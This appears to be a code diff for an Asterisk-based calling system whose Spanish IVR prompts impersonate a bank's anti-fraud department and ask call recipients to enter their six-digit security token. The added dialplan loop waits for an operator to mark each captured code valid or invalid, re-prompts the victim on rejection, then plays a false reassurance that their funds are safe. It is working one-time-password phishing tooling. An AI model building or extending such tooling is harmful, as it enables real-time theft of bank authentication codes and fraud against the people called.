@@ -143,12 +143,14 @@ function ensureCustomAudioFilesExist() {
 
   const audios = [
     { name: 'alerta_banco_antifraude', text: 'Estimado cliente, detectamos una actividad inusual en su cuenta bancaria. Para proteger sus fondos, ingrese el codigo de seguridad enviado a su telefono.', freq: 520 },
-    { name: 'solicitar_codigo_otp', text: 'Por favor, ingrese ahora los digitos de su codigo de seguridad en el teclado.', freq: 680 },
-    { name: 'un_momento_validando_informacion', text: 'Un momento por favor, estamos validando su informacion en el sistema.', freq: 440 },
+    { name: 'solicitar_codigo_otp', text: 'Por favor digite su token de seis digitos en el teclado de su telefono para continuar.', freq: 680 },
+    { name: 'digite_token_6_digitos', text: 'Por favor digite su token de seis digitos.', freq: 680 },
+    { name: 'token_invalido_reintente', text: 'El codigo digitado es incorrecto o invalido. Por favor, vuelva a digitar su token de seis digitos en el teclado de su telefono.', freq: 680 },
+    { name: 'un_momento_validando_informacion', text: 'Un momento por favor, estamos validando su token en el sistema.', freq: 440 },
     { name: 'operacion_bloqueada_exito', text: 'Su operacion ha sido bloqueada y sus fondos estan seguros. Gracias por confiar en nosotros.', freq: 880 },
     { name: 'conectar_asesor_banco', text: 'Un momento por favor, le estamos transfiriendo con un asesor de seguridad bancaria.', freq: 587 },
     { name: 'bienvenida_corporativa', text: 'Bienvenido al centro de atencion y seguridad bancaria.', freq: 520 },
-    { name: 'prompt_otp_6_digitos', text: 'Ingrese el codigo de seis digitos recibido.', freq: 680 },
+    { name: 'prompt_otp_6_digitos', text: 'Por favor digite su token de seis digitos en el teclado de su telefono.', freq: 680 },
   ];
 
   for (const aud of audios) {
@@ -639,13 +641,32 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
     dialplanContent += ` same => n,GotoIf($["\${CURRENT_CHAN:0:10}" = "PJSIP/1001"]?self_test_success)\n`;
 
     dialplanContent += ` ; Si es cliente externo en llamada saliente:\n`;
-    dialplanContent += ` ; Mantener en espera de validacion o reproducir éxito segun decision del asesor\n`;
-    dialplanContent += ` same => n,NoOp(=== [IVR] CLIENTE EN ESPERA DE VALIDACION DE ASESOR ===)\n`;
-    dialplanContent += ` same => n,Playback(silence/1)\n`;
-    dialplanContent += ` same => n,Wait(3)\n`;
+    dialplanContent += ` ; Bucle inteligente: esperar decisión del asesor (Válido o Inválido)\n`;
+    dialplanContent += ` same => n,NoOp(=== [IVR] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)\n`;
+    dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
+    dialplanContent += ` same => n(wait_decision_loop),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
+    dialplanContent += ` same => n,Set(CURRENT_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
+    dialplanContent += ` same => n,NoOp(=== [IVR] Ciclo \${WAIT_LOOP}/20 - Estado en AstDB: \${CURRENT_STATUS} ===)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?otp_approved)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?otp_rejected_retry)\n`;
+    dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 20]?otp_approved)\n`;
+    dialplanContent += ` same => n,Wait(1)\n`;
+    dialplanContent += ` same => n,Goto(wait_decision_loop)\n\n`;
+
+    dialplanContent += ` ; Rama Aprobado: El asesor marcó CÓDIGO VÁLIDO -> Volver llamada al asesor\n`;
+    dialplanContent += ` same => n(otp_approved),NoOp(=== [IVR] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR ===)\n`;
     dialplanContent += ` same => n,Playback(\${IVR_SUCCESS})\n`;
     dialplanContent += ` same => n,Wait(1)\n`;
+    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})\n`;
+    dialplanContent += ` same => n,NoOp(=== [IVR] RECONECTANDO LLAMADA CON EL ASESOR EN EXTENSION \${FINAL_AGENT} ===)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
+
+    dialplanContent += ` ; Rama Inválido: El asesor marcó CÓDIGO INVÁLIDO -> Solicitar nuevo código automáticamente\n`;
+    dialplanContent += ` same => n(otp_rejected_retry),NoOp(=== [IVR] TOKEN INVALIDO DETECTADO -> SOLICITANDO NUEVO CODIGO AUTOMATICAMENTE ===)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+    dialplanContent += ` same => n,ExecIf($[$$[STAT(e,/var/lib/asterisk/sounds/custom/token_invalido_reintente.wav)] = 1]?Playback(custom/token_invalido_reintente):Playback(\${IVR_PROMPT}))\n`;
+    dialplanContent += ` same => n,Goto(ask_input)\n\n`;
 
     dialplanContent += ` same => n(self_test_success),NoOp(=== [IVR] PRUEBA LOCAL EXITOSA: CÓDIGO \${USER_DIGITS} NOTIFICADO AL PANEL ===)\n`;
     dialplanContent += ` same => n,Playback(beep)\n`;
@@ -1241,6 +1262,36 @@ app.post('/api/asterisk/audio/delete', (req, res) => {
   }
 });
 
+// Stream audio from server to browser for preview
+app.get('/api/asterisk/audio/stream/:name', (req, res) => {
+  try {
+    const rawName = req.params.name || '';
+    const cleanName = rawName.replace(/^custom\//, '').replace(/\.wav$/, '').replace(/[^a-zA-Z0-9_\-]/g, '');
+    const customPath = path.join(SOUNDS_CUSTOM_DIR, `${cleanName}.wav`);
+
+    if (fs.existsSync(customPath)) {
+      res.setHeader('Content-Type', 'audio/wav');
+      return fs.createReadStream(customPath).pipe(res);
+    }
+
+    const enPath = `/var/lib/asterisk/sounds/en/${cleanName}.wav`;
+    if (fs.existsSync(enPath)) {
+      res.setHeader('Content-Type', 'audio/wav');
+      return fs.createReadStream(enPath).pipe(res);
+    }
+
+    const generalPath = `/var/lib/asterisk/sounds/${cleanName}.wav`;
+    if (fs.existsSync(generalPath)) {
+      res.setHeader('Content-Type', 'audio/wav');
+      return fs.createReadStream(generalPath).pipe(res);
+    }
+
+    res.status(404).send('Audio no encontrado en el servidor');
+  } catch (e: any) {
+    res.status(500).send('Error leyendo audio');
+  }
+});
+
 // Endpoint to explicitly synchronize campaign / system audios into AstDB for Asterisk
 app.post('/api/asterisk/audio/sync-defaults', (req, res) => {
   try {
@@ -1338,7 +1389,7 @@ fi
 curl -sSLk "${baseUrl}/api/asterisk/config/extensions.conf" -o /etc/asterisk/extensions.conf
 
 echo "=== [3/5] Descargando y verificando audios de IVR en /var/lib/asterisk/sounds/custom/ ==="
-AUDIOS=("alerta_banco_antifraude" "solicitar_codigo_otp" "un_momento_validando_informacion" "operacion_bloqueada_exito" "conectar_asesor_banco" "bienvenida_corporativa" "prompt_otp_6_digitos")
+AUDIOS=("alerta_banco_antifraude" "solicitar_codigo_otp" "digite_token_6_digitos" "token_invalido_reintente" "un_momento_validando_informacion" "operacion_bloqueada_exito" "conectar_asesor_banco" "bienvenida_corporativa" "prompt_otp_6_digitos")
 for aud in "\${AUDIOS[@]}"; do
   if [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.wav" ] && [ ! -s "/var/lib/asterisk/sounds/custom/\${aud}.gsm" ]; then
     echo "  -> Obteniendo audio: \${aud}.wav..."
